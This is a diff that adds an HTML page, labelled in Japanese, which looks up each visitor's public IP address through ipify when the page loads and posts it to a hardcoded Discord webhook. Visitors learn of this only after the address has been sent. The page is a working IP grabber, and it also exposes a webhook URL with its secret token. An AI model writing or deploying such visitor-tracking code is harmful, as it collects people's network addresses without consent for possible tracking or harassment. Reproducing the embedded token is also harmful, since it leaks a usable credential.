@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send IP to Discord Webhook</title>
+</head>
+<body>
+    <h1>IPアドレスをDiscordに送信</h1>
+    <p id="status">送信準備中...</p>
+
+    <script>
+        function sendToDiscord(ipAddress) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1183278777942417479/wbrOJyHloqeYCOTOGobHnmsbsb4449wxWJFade-XvcZD16vEDu0e944hBSsID-_oC6iG';
+            const message = {
+                content: `訪問者のIPアドレス: ${ipAddress}`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            })
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById('status').textContent = 'IPアドレスがDiscordに送信されました。';
+                } else {
+                    document.getElementById('status').textContent = '送信に失敗しました。';
+                }
+            })
+            .catch(error => {
+                console.error('Error sending to Discord:', error);
+                document.getElementById('status').textContent = '送信に失敗しました。';
+            });
+        }
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                sendToDiscord(data.ip);
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error);
+                document.getElementById('status').textContent = 'IPアドレスを取得できませんでした。';
+            });
+    </script>
+</body>
+</html>
